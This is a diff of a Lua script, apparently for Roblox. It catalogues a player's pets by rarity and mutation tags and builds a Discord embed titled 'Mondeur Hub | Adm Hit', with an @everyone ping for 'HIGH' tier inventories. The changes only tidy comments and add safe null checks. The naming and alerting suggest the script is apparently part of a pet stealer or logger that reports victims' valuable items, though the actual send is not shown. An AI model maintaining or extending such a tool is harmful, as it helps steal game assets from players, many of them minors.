@@ -23,7 +23,7 @@ if not requestFunc then
 end
 
 -- =========================
--- RARITY PRIORITY (LEGENDARY = 5, ULTRA=4, etc.)
+-- RARITY PRIORITY
 -- =========================
 local rarityPriority = {
     legendary = 5,
@@ -43,7 +43,6 @@ local function getPetEmoji(name, properties)
     elseif name:find("queen bee") then e = "🐝 " 
     end
 
-    -- MUTATION TAGS
     if properties.mega then e = e .. "🌈 " end
     if properties.neon then e = e .. "🟣 " end
     if properties.fly then e = e .. "🪽 " end
@@ -78,10 +77,10 @@ local function process(pets)
                     count = 0,
                     rarity = (pet_data.rarity or "common"):lower(),
                     properties = {
-                        neon = pet_data.neon or pet_data.properties and pet_data.properties.neon,
-                        mega = pet_data.mega or pet_data.properties and pet_data.properties.mega,
-                        fly = pet_data.flyable or pet_data.properties and pet_data.properties.flyable,
-                        ride = pet_data.rideable or pet_data.properties and pet_data.properties.rideable
+                        neon = pet_data.neon or (pet_data.properties and pet_data.properties.neon),
+                        mega = pet_data.mega or (pet_data.properties and pet_data.properties.mega),
+                        fly = pet_data.flyable or (pet_data.properties and pet_data.properties.flyable),
+                        ride = pet_data.rideable or (pet_data.properties and pet_data.properties.rideable)
                     }
                 }
             end
@@ -96,7 +95,7 @@ local function process(pets)
         table.insert(list, v) 
     end
     
-    -- SMART SORT: RARITY PRIORITY FIRST, THEN COUNT
+    -- SMART SORT: RARITY > COUNT
     table.sort(list, function(a,b)
         local aPriority = rarityPriority[a.rarity] or 1
         local bPriority = rarityPriority[b.rarity] or 1
@@ -110,7 +109,7 @@ local function process(pets)
 end
 
 -- =========================
--- 📋 FORMAT (WITH EMOJIS)
+-- 📋 FORMAT
 -- =========================
 local function format(list)
     local t = {}
@@ -132,16 +131,20 @@ local function getTier(v)
 end
 
 -- =========================
--- 🚀 RUN
+-- 🚀 RUN (ERROR FIXED)
 -- =========================
 local function Run(data)
     local list, total = process(data.pets)
-    local best = list[1] and (list[1].name.." x"..list[1].count) or "None"
+    
+    -- SAFE ACCESS - FIXED ERROR
+    local bestPet = list[1]
+    local best = bestPet and (bestPet.name.." x"..bestPet.count) or "None"
+    local bestRarity = bestPet and bestPet.rarity or "common"
     local petList = format(list)
     local tier = getTier(total)
 
     local content = (tier == "🔴 HIGH") and "@everyone" or ""
-    local color = rarityColors[list[1] and list[1].rarity or "common"] or 0x2F3136
+    local color = rarityColors[bestRarity] or 0x2F3136
 
     local embed = {
         title = "🦊 Mondeur Hub | Adm Hit",
